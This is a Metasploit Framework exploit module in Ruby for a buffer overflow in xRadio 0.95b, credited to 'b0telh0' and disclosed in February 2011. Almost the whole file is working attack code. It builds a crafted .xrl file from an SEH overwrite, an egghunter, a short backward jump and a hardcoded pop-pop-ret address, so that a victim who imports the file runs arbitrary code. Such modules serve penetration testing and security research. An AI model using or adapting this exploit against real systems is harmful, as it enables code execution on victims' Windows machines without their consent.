# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh
  include Msf::Exploit::Remote::Egghunter

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;xRadio 0.95b Buffer Overflow&#039;,
      &#039;Description&#039;     => %q{
        This module exploits a buffer overflow in xRadio 0.95b.
        Using the application to import a specially crafted xrl file,
        a buffer overflow occurs allowing arbitrary code execution.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;b0telh0 <me[at]gotgeek.com.br>&#039;,
        ],
      &#039;References&#039;      =>
        [
          [ &#039;BID&#039;, &#039;46290&#039; ],
          [ &#039;EDB&#039;, &#039;16141&#039; ]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;EXITFUNC&#039; => &#039;seh&#039;,
          &#039;DisablePayloadHandler&#039; => &#039;true&#039;
        },
      &#039;Platform&#039;        => &#039;win&#039;,
      &#039;Payload&#039;         =>
        {
          &#039;Space&#039; => 1000,
          &#039;BadChars&#039; => "\x00\x0a\x0d",
          &#039;StackAdjustment&#039; => -3500
        },
      &#039;Targets&#039;         =>
        [
          [ &#039;Windows Universal&#039;,
            {
              # pop eax - pop ebx - ret xradio.exe
              &#039;Ret&#039; => 0x0047E282
            }
          ],
        ],
      &#039;Privileged&#039;      => false,
      &#039;DisclosureDate&#039;  => &#039;Feb 08 2011&#039;,
      &#039;DefaultTarget&#039;   => 0))

    register_options(
      [
        OptString.new(&#039;FILENAME&#039;, [true, &#039;The file name.&#039;, &#039;msf.xrl&#039;])
      ], self.class)

  end

  def exploit
    eggoptions =
    {
      :checksum => true,
      :eggtag => &#039;w00t&#039;
    }

    hunter,egg = generate_egghunter(payload.encoded, eggoptions)

    buffer =  rand_text_alpha_upper(4066-egg.length)
    buffer << egg
    buffer << make_nops(10)
    buffer << hunter
    buffer << "\xeb\xd8\xff\xff"      # nseh  jmp back 40 bytes
    buffer << [target.ret].pack(&#039;V&#039;)  # seh

    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
    file_create(buffer)
  end

end



